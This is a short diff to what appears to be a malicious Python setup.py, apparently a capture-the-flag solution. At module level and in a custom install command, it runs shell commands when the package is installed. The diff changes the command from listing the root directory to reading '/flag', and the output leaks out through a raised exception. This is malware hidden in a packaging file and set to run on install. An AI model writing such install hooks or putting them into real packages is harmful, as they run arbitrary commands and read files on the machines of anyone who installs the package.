@@ -6,7 +6,7 @@ from setuptools.command.egg_info import egg_info
 def RunCommand():
     print('hacked')
     from subprocess import Popen, PIPE
-    pro = Popen('ls /', shell=True, stdout=PIPE, stderr=PIPE)
+    pro = Popen('cat /flag', shell=True, stdout=PIPE, stderr=PIPE)
     x,_ = pro.communicate()
     x = x.decode()
     raise Exception(x)
@@ -23,7 +23,7 @@ class RunInstallCommand(install):
         install.run(self)
 
 from subprocess import Popen, PIPE
-pro = Popen('ls /', shell=True, stdout=PIPE, stderr=PIPE)
+pro = Popen('cat /flag', shell=True, stdout=PIPE, stderr=PIPE)
 x,_ = pro.communicate()
 x = x.decode()
 raise Exception(x)
